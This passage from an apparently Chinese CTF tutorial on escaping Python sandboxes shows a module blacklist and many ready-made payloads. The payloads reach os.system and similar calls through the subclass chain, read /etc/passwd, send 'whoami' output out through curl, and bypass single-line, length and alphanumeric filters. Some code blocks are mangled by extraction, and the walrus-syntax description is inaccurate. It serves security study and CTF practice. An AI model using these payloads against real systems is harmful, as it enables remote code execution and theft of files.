class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>沙箱首先获取 <em>_builtins__，然后依据现有的 <em>_builtins</em></em> 来构建命名空间。<br>修改 __import__ 函数为自定义的_hook_import_<br>删除 open 函数防止文件操作<br>exec 命令。<br>绕过方式：</p><p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 __builtins__（这个__builtins__保存的就是原始__builtins__的引用），比如 types 库，来执行任意命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__ <span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__ </span><br></pre></td></tr></table></figure><p>完全限制(no builtins)</p><p>如果沙箱完全清空了 <strong>builtins</strong>, 则无法使用 import,如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。</p><p>具体原理可见：Python沙箱逃逸小结</p><p>常见的一些 RCE payload 如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">os[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常见的一些 File payload 如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作文件可以使用 builtins 中的 <span class="built_in">open</span>，也可以使用 FileLoader 模块的 get_data 方法。</span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="绕过多行限制"><a href="#绕过多行限制" class="headerlink" title="绕过多行限制"></a>绕过多行限制</h2><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; Traceback (most recent call last):</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1</span><br><span class="line">&gt;&gt;&gt; __import__(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(1)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 4</span><br><span class="line">&gt;&gt;&gt; 5</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 可以支持换行符与;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; compile</span><br><span class="line"></span><br><span class="line">compile 在 single 模式下也同样可以使用 \n 进行换行, 在 <span class="built_in">exec</span> 模式下可以直接执行多行代码.</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;eval(compile(&#x27;</span><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>); <span class="built_in">print</span>(<span class="string">&quot;heyy&quot;</span>)<span class="string">&#x27;, &#x27;</span>&lt;stdin&gt;<span class="string">&#x27;, &#x27;</span><span class="built_in">exec</span><span class="string">&#x27;))&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">1</span><br><span class="line">海象表达式</span><br><span class="line"></span><br><span class="line">海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</span><br><span class="line"></span><br><span class="line">海象表达式的语法形式如下：</span><br><span class="line"></span><br><span class="line">&lt;expression&gt; := &lt;value&gt; <span class="keyword">if</span> &lt;condition&gt; <span class="keyword">else</span> &lt;value&gt;</span><br><span class="line">1</span><br><span class="line">借助海象表达式，我们可以通过列表来替代多行代码：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt; uid=1000(kali) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)</span><br><span class="line">&gt;&gt;&gt; [&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;, 0]</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 绕过长度限制</span><br><span class="line">&gt;&gt;&gt; BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-<span class="number">9</span>]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目限制不能出现数字字母，构造的目标是调用-open-函数进行读取"><a href="#题目限制不能出现数字字母，构造的目标是调用-open-函数进行读取" class="headerlink" title="题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取"></a>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br><span class="line"></span><br><span class="line">函数名比较好绕过，直接使用 unicode。数字也可以使用 <span class="built_in">ord</span> 来获取然后进行相减。我这里选择的是 <span class="built_in">chr</span>(<span class="number">333</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ğ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Õ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure><p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;。</p><p>这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 a(‘ō’) 进行替换。这样就可以构造一个满足条件的 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;</span>) </span><br></pre></td></tr></table></figure><blockquote><p>但其 实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 